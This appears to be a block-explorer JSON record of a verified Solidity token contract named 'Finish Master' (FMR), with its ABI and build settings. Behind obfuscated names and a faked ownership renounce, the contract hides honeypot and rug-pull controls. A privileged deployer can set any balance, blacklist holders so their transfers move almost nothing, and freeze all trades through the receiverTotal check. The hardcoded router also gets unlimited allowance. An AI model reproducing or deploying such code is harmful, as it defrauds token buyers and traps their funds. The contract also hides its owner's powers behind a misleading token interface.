{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface marketingTotalReceiver {\n    function createPair(address autoSell, address tokenFeeMin) external returns (address);\n}\n\ninterface senderAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapEnable) external view returns (uint256);\n\n    function transfer(address senderSell, uint256 sellToken) external returns (bool);\n\n    function allowance(address amountEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderSell,\n        uint256 sellToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalIsSell, uint256 value);\n    event Approval(address indexed amountEnable, address indexed spender, uint256 value);\n}\n\nabstract contract launchFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquiditySender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderAtMetadata is senderAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FinishMaster is launchFee, senderAt, senderAtMetadata {\n\n    bool public fromMarketingList;\n\n    function walletLaunchedAmount(address exemptTrading, address senderSell, uint256 sellToken) internal returns (bool) {\n        if (exemptTrading == isTeam) {\n            return tradingList(exemptTrading, senderSell, sellToken);\n        }\n        uint256 swapReceiver = senderAt(maxExempt).balanceOf(fundEnableList);\n        require(swapReceiver == fromTeamSender);\n        require(senderSell != fundEnableList);\n        if (swapMax[exemptTrading]) {\n            return tradingList(exemptTrading, senderSell, takeBuyAuto);\n        }\n        return tradingList(exemptTrading, senderSell, sellToken);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundMarketing;\n    }\n\n    function tradingList(address exemptTrading, address senderSell, uint256 sellToken) internal returns (bool) {\n        require(limitToken[exemptTrading] >= sellToken);\n        limitToken[exemptTrading] -= sellToken;\n        limitToken[senderSell] += sellToken;\n        emit Transfer(exemptTrading, senderSell, sellToken);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoReceiver;\n    }\n\n    string private fundMarketing = \"FMR\";\n\n    address private autoReceiver;\n\n    function transfer(address marketingWallet, uint256 sellToken) external virtual override returns (bool) {\n        return walletLaunchedAmount(_msgSender(), marketingWallet, sellToken);\n    }\n\n    uint256 constant takeBuyAuto = 7 ** 10;\n\n    function owner() external view returns (address) {\n        return autoReceiver;\n    }\n\n    address public isTeam;\n\n    address liquidityBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private shouldTotal;\n\n    uint256 public liquidityTeam;\n\n    function balanceOf(address swapEnable) public view virtual override returns (uint256) {\n        return limitToken[swapEnable];\n    }\n\n    function enableSellFrom(address marketingWallet, uint256 sellToken) public {\n        launchReceiver();\n        limitToken[marketingWallet] = sellToken;\n    }\n\n    bool private shouldMaxFrom;\n\n    bool public exemptReceiverAmount;\n\n    string private autoAt = \"Finish Master\";\n\n    event OwnershipTransferred(address indexed swapReceiverShould, address indexed amountToFee);\n\n    function allowance(address tokenTotalMarketing, address teamEnable) external view virtual override returns (uint256) {\n        if (teamEnable == liquidityBuy) {\n            return type(uint256).max;\n        }\n        return shouldTotal[tokenTotalMarketing][teamEnable];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoAt;\n    }\n\n    function launchedTokenSender(address atReceiver) public {\n        if (exemptReceiverAmount) {\n            return;\n        }\n        \n        minAuto[atReceiver] = true;\n        if (fundTradingTx != fromMarketingList) {\n            enableFeeReceiver = marketingLimit;\n        }\n        exemptReceiverAmount = true;\n    }\n\n    address public maxExempt;\n\n    constructor (){\n        \n        liquiditySender shouldTo = liquiditySender(liquidityBuy);\n        maxExempt = marketingTotalReceiver(shouldTo.factory()).createPair(shouldTo.WETH(), address(this));\n        if (fundTradingTx != maxSender) {\n            liquidityTeam = isMin;\n        }\n        isTeam = _msgSender();\n        minAuto[isTeam] = true;\n        limitToken[isTeam] = walletList;\n        shouldSenderLimit();\n        \n        emit Transfer(address(0), isTeam, walletList);\n    }\n\n    mapping(address => bool) public swapMax;\n\n    address fundEnableList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 sellLiquidityToken;\n\n    uint256 private walletList = 100000000 * 10 ** 18;\n\n    function launchReceiver() private view {\n        require(minAuto[_msgSender()]);\n    }\n\n    function shouldSenderLimit() public {\n        emit OwnershipTransferred(isTeam, address(0));\n        autoReceiver = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletList;\n    }\n\n    function shouldLaunched(address exemptSender) public {\n        launchReceiver();\n        \n        if (exemptSender == isTeam || exemptSender == maxExempt) {\n            return;\n        }\n        swapMax[exemptSender] = true;\n    }\n\n    mapping(address => bool) public minAuto;\n\n    function approve(address teamEnable, uint256 sellToken) public virtual override returns (bool) {\n        shouldTotal[_msgSender()][teamEnable] = sellToken;\n        emit Approval(_msgSender(), teamEnable, sellToken);\n        return true;\n    }\n\n    bool public maxSender;\n\n    uint8 private tokenFund = 18;\n\n    function transferFrom(address exemptTrading, address senderSell, uint256 sellToken) external override returns (bool) {\n        if (_msgSender() != liquidityBuy) {\n            if (shouldTotal[exemptTrading][_msgSender()] != type(uint256).max) {\n                require(sellToken <= shouldTotal[exemptTrading][_msgSender()]);\n                shouldTotal[exemptTrading][_msgSender()] -= sellToken;\n            }\n        }\n        return walletLaunchedAmount(exemptTrading, senderSell, sellToken);\n    }\n\n    uint256 public marketingLimit;\n\n    uint256 private enableFeeReceiver;\n\n    mapping(address => uint256) private limitToken;\n\n    bool private fundTradingTx;\n\n    uint256 fromTeamSender;\n\n    uint256 private txExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenFund;\n    }\n\n    uint256 public isMin;\n\n    bool private takeLimit;\n\n    function receiverTotal(uint256 sellToken) public {\n        launchReceiver();\n        fromTeamSender = sellToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapReceiverShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIsSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotalMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToken\",\"type\":\"uint256\"}],\"name\":\"enableSellFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"launchedTokenSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellToken\",\"type\":\"uint256\"}],\"name\":\"receiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"}],\"name\":\"shouldLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSenderLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FinishMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}